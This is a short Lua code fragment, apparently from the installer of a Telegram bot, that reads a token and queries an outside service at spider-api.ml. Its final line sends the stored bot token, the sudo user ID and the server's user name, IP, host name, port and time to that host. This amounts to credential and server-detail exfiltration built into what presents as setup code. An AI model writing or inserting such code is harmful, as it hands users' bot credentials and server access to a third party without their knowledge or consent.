...
local token = io.read()
if token ~= '' then
data,res = https.request("https://spider-api.ml/index.php?p="..GithubUser)
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://spider-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
...
local t = json:decode(https.request('https://spider-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
